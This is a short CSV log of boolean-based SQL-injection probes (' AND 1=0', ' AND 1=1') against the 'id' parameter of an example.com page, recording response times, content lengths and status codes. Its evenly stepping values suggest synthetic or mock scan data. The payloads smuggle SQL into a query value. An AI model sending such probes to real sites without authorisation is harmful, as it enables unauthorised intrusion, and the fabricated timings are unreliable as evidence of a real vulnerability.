timestamp,url,parameter,injection_type,payload,baseline_time,injected_time,delta,content_length,status_code
2025-12-16T12:34:29.030407,http://example.com/page?id=0,id,boolean, AND 1=0,0.3,0.4,0.10000000000000003,5000,200
2025-12-16T12:34:29.046902,http://example.com/page?id=1,id,boolean, AND 1=1,0.31,0.41000000000000003,0.10000000000000003,5100,200
2025-12-16T12:34:29.057019,http://example.com/page?id=2,id,boolean, AND 1=0,0.32,0.42000000000000004,0.10000000000000003,5200,200
2025-12-16T12:34:29.066536,http://example.com/page?id=3,id,boolean, AND 1=1,0.32999999999999996,0.43000000000000005,0.10000000000000009,5300,200
2025-12-16T12:34:29.077403,http://example.com/page?id=4,id,boolean, AND 1=0,0.33999999999999997,0.44,0.10000000000000003,5400,200
2025-12-16T12:34:29.086807,http://example.com/page?id=5,id,boolean, AND 1=1,0.35,0.45,0.10000000000000003,5500,200
2025-12-16T12:34:29.098319,http://example.com/page?id=6,id,boolean, AND 1=0,0.36,0.46,0.10000000000000003,5600,200
2025-12-16T12:34:29.109362,http://example.com/page?id=7,id,boolean, AND 1=1,0.37,0.47000000000000003,0.10000000000000003,5700,200
2025-12-16T12:34:29.118814,http://example.com/page?id=8,id,boolean, AND 1=0,0.38,0.48000000000000004,0.10000000000000003,5800,200
2025-12-16T12:34:29.129582,http://example.com/page?id=9,id,boolean, AND 1=1,0.39,0.49,0.09999999999999998,5900,200
